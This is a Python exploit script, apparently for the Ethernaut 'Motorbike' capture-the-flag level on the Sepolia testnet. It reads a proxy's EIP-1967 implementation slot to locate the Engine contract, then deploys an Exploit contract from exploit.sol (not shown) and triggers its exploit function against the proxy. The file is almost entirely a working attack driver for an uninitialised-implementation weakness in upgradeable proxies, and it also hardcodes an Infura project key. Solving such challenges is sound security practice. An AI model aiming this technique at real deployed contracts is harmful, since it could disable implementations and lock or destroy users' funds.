#!/usr/bin/env python3

import os
from pathlib import Path
from time import sleep
from ethtools.pwn.prelude import *

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('proxy_addr', type=str)
parser.add_argument('--wallet', type=str, default='Laptop CTF Metamask', help="Wallet to use for the exploit transaction")
ARGS = parser.parse_args()

MY_WALLET = get_wallet(ARGS.wallet)
assert MY_WALLET is not None

context.log_level = 'DEBUG'

context.connect_http('https://sepolia.infura.io/v3/7358ed45ca2643de9e4b63848de2e3a8')
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

CUR_DIR = Path(__file__).resolve().parent

solidity_includes = CUR_DIR.joinpath('..', '__solidity_includes').resolve()

CONTRACT_METADATA.compiler.add_import_remappings({
    'openzeppelin-contracts-08': solidity_includes / 'openzeppelin-contracts-0.8/contracts',
    'openzeppelin-contracts-0.8': solidity_includes / 'openzeppelin-contracts-0.8/contracts',
    'openzeppelin-contracts-06': solidity_includes / 'openzeppelin-contracts-0.6/contracts',
    'openzeppelin-contracts-0.6': solidity_includes / 'openzeppelin-contracts-0.6/contracts',
})


# import ipdb; ipdb.set_trace()
CONTRACT_METADATA.add_contracts_from_solidity_files([os.path.join(CUR_DIR, 'exploit.sol')])

bike = CONTRACT_METADATA['Motorbike'].get_contract_at(ARGS.proxy_addr)
IMPLEMENTATION_SLOT='0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
engine_addr = context.w3.eth.get_storage_at(ARGS.proxy_addr, IMPLEMENTATION_SLOT)
assert engine_addr[:12] == b'\x00' * 12
engine_addr = engine_addr[12:]
engine = CONTRACT_METADATA['Engine'].get_contract_at(engine_addr)

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr, engine.address) as (tx_hash, target):
    sleep(2)
    transact(target.functions.exploit(), force=True)
